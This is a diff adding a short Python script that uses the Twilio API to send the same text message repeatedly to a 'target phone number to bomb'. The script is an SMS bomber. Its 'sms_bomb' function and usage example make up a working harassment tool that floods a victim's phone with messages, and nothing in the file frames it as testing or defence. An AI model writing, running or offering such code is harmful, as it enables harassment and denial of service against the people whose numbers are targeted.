@@ -1,0 +1,28 @@
+from twilio.rest import Client
+import time
+
+def send_sms(to_number, from_number, message):
+    account_sid = 'your_account_sid'
+    auth_token = 'your_auth_token'
+    client = Client(account_sid, auth_token)
+
+    message = client.messages.create(
+        body=message,
+        from_=from_number,
+        to=to_number
+    )
+
+    print(f"Message sent to {to_number}: {message.sid}")
+
+def sms_bomb(to_number, from_number, message, num_times):
+    for _ in range(num_times):
+        send_sms(to_number, from_number, message)
+        time.sleep(1)  # Delay between each message (1 second in this example)
+
+# Usage example
+target_number = '1234567890'  # Target phone number to bomb
+twilio_number = '0987654321'  # Your Twilio phone number
+bomb_message = 'This is an SMS bomb test!'  # Message to be sent
+bomb_count = 10  # Number of times to send the message
+
+sms_bomb(target_number, twilio_number, bomb_message, bomb_count)
